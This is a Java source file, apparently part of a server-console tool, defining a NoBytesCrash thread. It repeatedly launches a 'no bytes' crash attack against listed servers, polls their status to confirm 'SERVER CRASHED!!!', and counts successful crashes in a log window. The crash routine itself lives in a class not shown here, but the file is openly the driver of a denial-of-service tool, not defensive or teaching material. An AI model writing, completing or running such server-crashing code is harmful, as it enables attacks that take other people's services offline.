/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package konsola;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;

/**
 *
 * @author Mateusz
 */
public class NoBytesCrash extends Thread {

    Server el;
    boolean loop = false;
    int count = 0;

    static void crash() {
        for (Server el : Konsola.lista) {
            if (el.crash) {
                NoBytesCrash s = new NoBytesCrash(el);
                s.start();
            }
        }

    }

    public NoBytesCrash(Server el) {
        this.el = el;
    }

    @Override
    public void run() {
        NoByteCrash();
    }

    private void NoByteCrash() {
        CrashLog log = new CrashLog(el.name, el.ips, this, loop);
        do {
            try {
                log.log.setText("");
                log.amount.setText(count + "");
                log.log.append("Waiting 10sec for the server response...\n");
                int i = 0;
                while (el.sendStatus() == "" && i < 10) {
                    Thread.sleep(1000);
                    i++;
                };
                if (i > 9) {
                    log.log.append("Server didn't respond\n");

                    log.time.setText("Close for 3 sec");
                    Thread.sleep(1000);
                    log.time.setText("Close for 2 sec");
                    Thread.sleep(1000);
                    log.time.setText("Close for 1 sec");
                    Thread.sleep(1000);
                    log.dispose();
                    loop = false;
                }
                log.log.append("Starting attack...\n");
                el.NoByteCrash();
                log.log.append("Checking server status...\n");
                if (el.sendStatus().isEmpty()) {
                    log.log.append("\nSERVER CRASHED!!!");
                    count++;
                } else {
                    log.log.append("\nCrash failed!");
                }
                log.time.setText("Close for 3 sec");
                Thread.sleep(1000);
                log.time.setText("Close for 2 sec");
                Thread.sleep(1000);
                log.time.setText("Close for 1 sec");
                Thread.sleep(1000);
            } catch (InterruptedException ex) {
                Logger.getLogger(NoBytesCrash.class.getName()).log(Level.SEVERE, null, ex);
            }
        } while (loop);
        log.dispose();
    }
    
    void stopp(){
        el.stop = true;
    }

}
